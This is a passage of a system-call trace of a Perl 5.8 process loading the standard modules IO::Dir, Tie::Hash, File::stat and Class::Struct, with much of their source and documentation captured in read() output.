File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
11891 07:39:45.210047 stat64("/etc/perl/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210065 stat64("/etc/perl/Tie/Hash.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210078 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210091 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210105 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210118 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210140 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210152 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210165 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210177 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210190 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210202 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210216 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210229 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
11891 07:39:45.210250 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.210265 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.210276 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.210295 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
11891 07:39:45.210608 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
11891 07:39:45.210720 read(8, "", 4096) = 0
11891 07:39:45.210736 close(8)          = 0
11891 07:39:45.210769 stat64("/etc/perl/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210784 stat64("/etc/perl/File/stat.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210798 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210811 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210825 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210838 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210852 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210864 stat64("/usr/lib/perl5/File/stat.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210877 stat64("/usr/share/perl5/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210890 stat64("/usr/share/perl5/File/stat.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210903 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210916 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210930 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.210942 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
11891 07:39:45.210964 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.210983 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.210995 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.211012 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
11891 07:39:45.211413 stat64("/etc/perl/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211432 stat64("/etc/perl/Class/Struct.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.211446 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211463 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.211478 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211491 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.211506 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211518 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.211531 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211543 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.211557 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211570 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.211584 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.211605 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
11891 07:39:45.211629 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
11891 07:39:45.211644 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb57c8) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.211656 _llseek(10, 0, [0], SEEK_CUR) = 0
11891 07:39:45.211676 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
11891 07:39:45.212066 brk(0x82de000)    = 0x82de000
11891 07:39:45.212425 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
11891 07:39:45.213034 _llseek(10, 6916, [6916], SEEK_SET) = 0
11891 07:39:45.213051 _llseek(10, 0, [6916], SEEK_CUR) = 0
11891 07:39:45.213062 close(10)         = 0
11891 07:39:45.213244 _llseek(8, 1334, [1334], SEEK_SET) = 0
11891 07:39:45.213260 _llseek(8, 0, [1334], SEEK_CUR) = 0
11891 07:39:45.213271 close(8)          = 0
11891 07:39:45.213899 brk(0x82ff000)    = 0x82ff000
11891 07:39:45.214045 _llseek(6, 2689, [2689], SEEK_SET) = 0
11891 07:39:45.214060 _llseek(6, 0, [2689], SEEK_CUR) = 0
11891 07:39:45.214071 close(6)          = 0
11891 07:39:45.214226 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7db4908) = 11892
11892 07:39:45.221216 getppid()         = 11891
